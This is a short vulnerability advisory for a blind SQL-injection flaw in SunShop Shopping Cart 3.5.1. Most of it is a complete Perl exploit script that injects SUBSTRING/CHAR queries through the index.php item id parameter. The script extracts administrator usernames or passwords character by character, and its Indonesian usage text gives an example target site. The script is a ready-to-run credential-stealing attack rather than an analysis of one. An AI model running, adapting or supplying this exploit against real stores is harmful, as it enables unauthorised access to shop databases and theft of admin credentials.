source: http://www.securityfocus.com/bid/29241/info

SunShop Shopping Cart is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

SunShop Shopping Cart 3.5.1 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl -w
use LWP::UserAgent;
# scripts : SunShop Version 3.5.1 Remote Blind Sql Injection
# scripts site : http://www.turnkeywebtools.com/sunshop/
# Discovered
# By : irvian
# site : http://irvian.cn
# email : irvian.info@gmail.com

print "\r\n[+]-----------------------------------------[+]\r\n";
print "[+]Blind SQL injection [+]\r\n";
print "[+]SunShop Version 3.5.1 [+]\r\n";
print "[+]code by irvian [+]\r\n";
print "[+]special : ifx, arioo, jipank, bluespy [+]\r\n";
print "[+]-----------------------------------------[+]\n\r";
if (@ARGV < 5){
die "

Cara Mengunakan : perl $0 host option id tabel itemid

Keterangan
host : http://victim.com
Option : pilih 1 untuk mencari username dan pilih 2 untuk mencari password
id : Isi Angka Kolom id biasanya 1, 2 ,3 dst
tabel : Isi Kolom tabel biasanya admin atau ss_admin
itemid : Isi Angka valid (ada productnya) di belakang index.php?action=item&id=
Contoh : perl $0 http://www.underhills.com/cart 1 1 admin 10
\n";}


$url = $ARGV[0];
$option = $ARGV[1];
$id = $ARGV[2];
$tabel = $ARGV[3];
$itemid = $ARGV[4];

if ($option eq 1){
syswrite(STDOUT, "username: ", 10);}
elsif ($option eq 2){
syswrite(STDOUT, "password: ", 10);}

for($i = 1; $i <= 32; $i++){
$f = 0;
$n = 32;
while(!$f && $n <= 57)
{
if(&blind($url, $option, $id, $tabel, $i, $n, $itemid)){
$f = 1;
syswrite(STDOUT, chr($n), 1);
}
$n++;
}
if ($f==0){
$n = 97;
while(!$f && $n <= 122)
{
if(&blind($url, $option, $id, $tabel, $i, $n, $itemid)){
$f = 1;
syswrite(STDOUT, chr($n), 1);
}
$n++;
}
}
}
print "\n[+]finish Execution Exploit\n";

sub blind {
my $site = $_[0];
my $op = $_[1];
my $id = $_[2];
my $tbl = $_[3];
my $i = $_[4];
my $n = $_[5];
my $item = $_[6];

if ($op eq 1){
$klm = "username";
}
elsif ($op eq 2){
$klm = "password";
}
my $ua = LWP::UserAgent->new;
my $url = "$site"."/index.php?action=item&id="."$item"."'%20AND%20SUBSTRING((SELECT%20"."$klm"."%20FROM%20"."$tbl"."%20WHERE%20id="."$id"."),"."$i".",1)=CHAR("."$n".")/*";
my $res = $ua->get($url);
my $browser = $res->content;
if ($browser !~ /This product is currently not viewable/i){
return 1;
}
else {
return 0;
}

}